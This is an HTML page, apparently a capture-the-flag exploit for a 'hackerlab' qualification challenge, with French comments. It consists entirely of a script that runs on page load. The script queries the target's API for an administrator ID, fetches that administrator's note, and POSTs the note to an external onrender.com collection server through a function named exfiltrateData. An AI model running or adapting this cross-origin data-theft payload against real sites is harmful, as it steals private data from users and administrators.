<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Momo</title>
</head>
<body>
    <script>
        // Fonction pour exfiltrer les données
        function exfiltrateData(data) {
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          xhr.send("chocolate=" + encodeURIComponent(data));
        }
      
        // Requête pour obtenir l'ID de l'administrateur
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://notes.qualif.hackerlab.bj/api.php", true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
            var response = JSON.parse(xhr.responseText);
            var adminId = response.id; // Supposons que l'ID de l'admin est dans la clé "admin_id"
            
            // Requête pour obtenir le contenu de la note en utilisant l'ID de l'admin
            var noteXhr = new XMLHttpRequest();
            noteXhr.open("GET", "https://notes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
            noteXhr.onreadystatechange = function() {
              if (noteXhr.readyState == 4 && noteXhr.status == 200) {
                var noteContent = noteXhr.responseText;
                exfiltrateData(noteContent);
              }
            };
            noteXhr.send();
          }
        };
        xhr.send();
        
        </script>      
</body>
</html>
